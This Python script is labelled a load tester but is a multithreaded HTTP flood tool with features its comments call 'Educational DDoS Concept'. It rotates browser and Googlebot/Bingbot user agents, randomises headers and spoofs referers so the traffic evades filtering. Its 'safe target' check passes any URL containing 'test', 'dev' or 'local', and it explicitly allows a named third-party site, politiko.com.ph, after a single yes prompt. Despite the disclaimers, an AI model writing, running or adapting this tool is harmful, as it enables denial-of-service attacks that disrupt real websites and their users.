import requests
import time
import threading
import statistics
from datetime import datetime
import argparse
import json
import random
import socket
from urllib.parse import urlparse


class AdvancedLoadTester:
    def __init__(self, target_url, num_threads=10, duration=60, delay=0.1):
        """
        Initialize the advanced load tester

        Args:
            target_url: URL to test (MUST be a server you own or have permission to test)
            num_threads: Number of concurrent threads
            duration: Test duration in seconds
            delay: Delay between requests in seconds
        """
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.delay = delay
        self.results = []
        self.running = False
        self.lock = threading.Lock()
        self.packet_count = 0

        # Parse URL for monitoring
        parsed_url = urlparse(target_url)
        self.domain = parsed_url.netloc
        self.path = parsed_url.path

        # Enhanced User-Agent rotation (Educational DDoS Concept)
        self.user_agents = [
            # Chrome variants
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            # Firefox variants
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            # Safari variants
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
            # Edge variants
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            # Mobile variants
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            # Bot variants (for educational purposes)
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'
        ]

        # Create session for connection pooling
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        })

    def get_random_headers(self):
        """Enhanced header randomization (Educational DDoS Concept)"""
        headers = self.session.headers.copy()
        headers['User-Agent'] = random.choice(self.user_agents)

        # Random header variations (Educational concept)
        header_variations = {
            'DNT': ['1', '0'],
            'Sec-Fetch-User': ['?1', '?0'],
            'Sec-Fetch-Site': ['none', 'same-origin', 'cross-site'],
            'Sec-Fetch-Mode': ['navigate', 'cors', 'no-cors'],
            'Sec-Fetch-Dest': ['document', 'empty', 'script'],
            'Cache-Control': ['max-age=0', 'no-cache', 'no-store'],
            'Pragma': ['no-cache', 'cache'],
            'Upgrade-Insecure-Requests': ['1', '0']
        }

        # Add random headers based on probability
        for header, values in header_variations.items():
            if random.random() > 0.3:  # 70% chance to add each header
                headers[header] = random.choice(values)

        # Add random referer (Educational concept)
        if random.random() > 0.6:  # 40% chance
            referers = [
                'https://www.google.com/',
                'https://www.bing.com/',
                'https://duckduckgo.com/',
                'https://www.yahoo.com/',
                'https://www.facebook.com/',
                'https://www.twitter.com/',
                'https://www.linkedin.com/',
                'https://www.reddit.com/'
            ]
            headers['Referer'] = random.choice(referers)

        # Add random accept-language (Educational concept)
        if random.random() > 0.5:  # 50% chance
            languages = [
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'es-ES,es;q=0.9',
                'fr-FR,fr;q=0.9',
                'de-DE,de;q=0.9',
                'it-IT,it;q=0.9',
                'pt-BR,pt;q=0.9',
                'ja-JP,ja;q=0.9',
                'ko-KR,ko;q=0.9',
                'zh-CN,zh;q=0.9'
            ]
            headers['Accept-Language'] = random.choice(languages)

        return headers

    def make_request(self, thread_id):
        """Enhanced request method with educational DDoS concepts"""
        start_time = time.time()
        self.packet_count += 1

        try:
            # Get random headers
            headers = self.get_random_headers()

            # Educational concept: Random request methods (GET, HEAD, POST)
            request_methods = ['GET', 'HEAD']
            if random.random() > 0.8:  # 20% chance for POST
                request_methods.append('POST')

            method = random.choice(request_methods)

            # Make the request with different methods
            if method == 'GET':
                response = self.session.get(
                    self.target_url,
                    headers=headers,
                    timeout=10,
                    allow_redirects=True
                )
            elif method == 'HEAD':
                response = self.session.head(
                    self.target_url,
                    headers=headers,
                    timeout=10,
                    allow_redirects=True
                )
            elif method == 'POST':
                # Educational concept: Random POST data
                post_data = {
                    'test': 'data',
                    'timestamp': str(int(time.time())),
                    'random': str(random.randint(1000, 9999))
                }
                response = self.session.post(
                    self.target_url,
                    headers=headers,
                    data=post_data,
                    timeout=10,
                    allow_redirects=True
                )
            end_time = time.time()

            response_time = end_time - start_time

            # Record the result with enhanced data
            with self.lock:
                self.results.append({
                    'thread_id': thread_id,
                    'request_id': self.packet_count,
                    'method': method,
                    'status_code': response.status_code,
                    'response_time': response_time,
                    'timestamp': datetime.now(),
                    'success': True,
                    'content_length': len(response.content),
                    'headers_sent': dict(headers),
                    'headers_received': dict(response.headers),
                    'user_agent': headers.get('User-Agent', 'Unknown')
                })

            # Display enhanced packet information
            self.display_packet_info(thread_id, method, response.status_code, response_time, len(response.content))

            return True

        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time

            with self.lock:
                self.results.append({
                    'thread_id': thread_id,
                    'request_id': self.packet_count,
                    'status_code': None,
                    'response_time': response_time,
                    'timestamp': datetime.now(),
                    'success': False,
                    'error': str(e)
                })

            self.display_error_info(thread_id, str(e), response_time)
            return False

    def display_packet_info(self, thread_id, method, status_code, response_time, content_length):
        """Enhanced packet information display with educational concepts"""
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]

        # Color coding based on status code
        if status_code == 200:
            status_emoji = "✅"
            status_color = "🟢"
        elif status_code >= 400:
            status_emoji = "❌"
            status_color = "🔴"
        else:
            status_emoji = "⚠️"
            status_color = "🟡"

        # Method emoji mapping
        method_emoji = {
            'GET': '📥',
            'POST': '📤',
            'HEAD': '👁️',
            'PUT': '📝',
            'DELETE': '🗑️'
        }

        method_icon = method_emoji.get(method, '📦')

        print(f"{method_icon} [{timestamp}] Thread-{thread_id:2d} | "
              f"Method: {method:4s} | "
              f"Status: {status_color}{status_code}{status_emoji} | "
              f"Time: {response_time:.3f}s | "
              f"Size: {content_length:,} bytes | "
              f"Packet #{self.packet_count}")

    def display_error_info(self, thread_id, error, response_time):
        """Display formatted error information"""
        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        print(f"❌ [{timestamp}] Thread-{thread_id:2d} | "
              f"Error: {error[:50]}... | "
              f"Time: {response_time:.3f}s | "
              f"Packet #{self.packet_count}")

    def worker(self, thread_id):
        """Worker thread that makes requests"""
        end_time = time.time() + self.duration

        while time.time() < end_time and self.running:
            self.make_request(thread_id)
            time.sleep(self.delay)

    def start_test(self):
        """Start the load test"""
        print(f"🚀 ADVANCED LOAD TEST")
        print("=" * 70)
        print(f"Target: {self.target_url}")
        print(f"Domain: {self.domain}")
        print(f"Path: {self.path}")
        print(f"Configuration:")
        print(f"   - Threads: {self.num_threads}")
        print(f"   - Duration: {self.duration} seconds")
        print(f"   - Delay: {self.delay} seconds")
        print(f"   - Expected packets: ~{int(self.duration / self.delay * self.num_threads)}")
        print("=" * 70)
        print("Format: 📦 [Time] Thread | Status | Response Time | Size | Packet #")
        print("=" * 70)

        # Safety check - ensure this is a safe target
        if not self.is_safe_target():
            print("❌ ERROR: This script can only be used on servers you own or have explicit permission to test!")
            print("   For safety, only these targets are allowed:")
            print("   - localhost (127.0.0.1)")
            print("   - Your own servers")
            print("   - Test environments you control")
            print("   - Sites you have written permission to test")
            return False

        self.running = True
        threads = []

        # Start worker threads
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.worker, args=(i + 1,))
            thread.start()
            threads.append(thread)

        # Monitor progress
        start_time = time.time()
        while time.time() < start_time + self.duration:
            elapsed = time.time() - start_time
            remaining = self.duration - elapsed
            print(
                f"\r⏱️  Progress: {elapsed:.1f}s / {self.duration}s ({(elapsed / self.duration) * 100:.1f}%) - Packets: {self.packet_count}",
                end="")
            time.sleep(1)

        # Stop all threads
        self.running = False
        for thread in threads:
            thread.join()

        print(f"\n✅ Load test completed!")
        return True

    def is_safe_target(self):
        """Check if the target is safe to test"""
        safe_domains = [
            'localhost',
            '127.0.0.1',
            '0.0.0.0',
            '::1',
            'test',
            'dev',
            'staging',
            'local'
        ]

        # Allow politiko.com.ph for educational purposes (with warning)
        if 'politiko.com.ph' in self.target_url:
            print("⚠️  WARNING: Testing against politiko.com.ph")
            print("   This is for educational purposes only.")
            print("   Ensure you have permission or this is your own site.")
            print("   DDoS attacks are illegal and can result in criminal charges.")
            response = input("   Continue? (y/N): ").strip().lower()
            return response == 'y'

        target_lower = self.target_url.lower()
        return any(domain in target_lower for domain in safe_domains)

    def generate_detailed_report(self):
        """Generate a comprehensive test report"""
        if not self.results:
            print("❌ No results to report")
            return

        successful_requests = [r for r in self.results if r['success']]
        failed_requests = [r for r in self.results if not r['success']]

        print("\n" + "=" * 70)
        print("📈 DETAILED LOAD TEST REPORT")
        print("=" * 70)

        # Basic statistics
        print(f"📊 Total Packets Sent: {len(self.results)}")
        print(f"✅ Successful: {len(successful_requests)}")
        print(f"❌ Failed: {len(failed_requests)}")
        print(f"📈 Success Rate: {(len(successful_requests) / len(self.results) * 100):.2f}%")

        if successful_requests:
            response_times = [r['response_time'] for r in successful_requests]
            content_lengths = [r['content_length'] for r in successful_requests]

            print(f"\n⏱️  Response Time Statistics:")
            print(f"   - Average: {statistics.mean(response_times):.3f}s")
            print(f"   - Median: {statistics.median(response_times):.3f}s")
            print(f"   - Min: {min(response_times):.3f}s")
            print(f"   - Max: {max(response_times):.3f}s")
            print(f"   - Standard Deviation: {statistics.stdev(response_times):.3f}s")

            print(f"\n📦 Content Size Statistics:")
            print(f"   - Average: {statistics.mean(content_lengths):,.0f} bytes")
            print(f"   - Median: {statistics.median(content_lengths):,.0f} bytes")
            print(f"   - Min: {min(content_lengths):,} bytes")
            print(f"   - Max: {max(content_lengths):,} bytes")

        # Status code distribution
        if successful_requests:
            status_codes = {}
            for r in successful_requests:
                code = r['status_code']
                status_codes[code] = status_codes.get(code, 0) + 1

            print(f"\n🔢 Status Code Distribution:")
            for code, count in sorted(status_codes.items()):
                percentage = (count / len(successful_requests)) * 100
                print(f"   - {code}: {count} ({percentage:.1f}%)")

        # Error analysis
        if failed_requests:
            print(f"\n❌ Error Analysis:")
            error_types = {}
            for r in failed_requests:
                error = r.get('error', 'Unknown')
                error_types[error] = error_types.get(error, 0) + 1

            for error, count in error_types.items():
                print(f"   - {error}: {count} occurrences")

        # Performance indicators
        if successful_requests:
            print(f"\n🎯 Performance Indicators:")
            packets_per_second = len(self.results) / self.duration
            print(f"   - Packets per second: {packets_per_second:.2f}")

            # Check for signs of server stress
            recent_times = [r['response_time'] for r in successful_requests[-10:]]
            if len(recent_times) >= 10:
                recent_avg = statistics.mean(recent_times)
                overall_avg = statistics.mean([r['response_time'] for r in successful_requests])

                if recent_avg > overall_avg * 1.5:
                    print(f"   - ⚠️  Server may be experiencing stress (recent responses slower)")
                else:
                    print(f"   - ✅ Server performance appears stable")

        # Save detailed results to file
        self.save_results_to_file()

    def save_results_to_file(self):
        """Save detailed results to a JSON file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"load_test_results_{timestamp}.json"

        # Convert datetime objects to strings for JSON serialization
        results_for_json = []
        for result in self.results:
            result_copy = result.copy()
            result_copy['timestamp'] = result_copy['timestamp'].isoformat()
            results_for_json.append(result_copy)

        data = {
            'test_info': {
                'target_url': self.target_url,
                'num_threads': self.num_threads,
                'duration': self.duration,
                'delay': self.delay,
                'timestamp': datetime.now().isoformat()
            },
            'results': results_for_json
        }

        try:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            print(f"\n💾 Detailed results saved to: {filename}")
        except Exception as e:
            print(f"\n⚠️  Could not save results: {e}")


def main():
    parser = argparse.ArgumentParser(description='Advanced Load Testing Tool')
    parser.add_argument('--url', default='http://localhost:8000',
                        help='Target URL (must be a server you own)')
    parser.add_argument('--threads', type=int, default=5,
                        help='Number of concurrent threads')
    parser.add_argument('--duration', type=int, default=30,
                        help='Test duration in seconds')
    parser.add_argument('--delay', type=float, default=0.1,
                        help='Delay between requests in seconds')

    args = parser.parse_args()

    # Create and run load tester
    tester = AdvancedLoadTester(
        target_url=args.url,
        num_threads=args.threads,
        duration=args.duration,
        delay=args.delay
    )

    if tester.start_test():
        tester.generate_detailed_report()


if __name__ == "__main__":
    print("⚠️  ADVANCED LOAD TESTING TOOL")
    print("=" * 50)
    print("This tool is for educational purposes only.")
    print("Only use it on servers you own or have permission to test.")
    print("DDoS attacks are illegal and can result in criminal charges.")
    print("=" * 50)
    print()

    main()
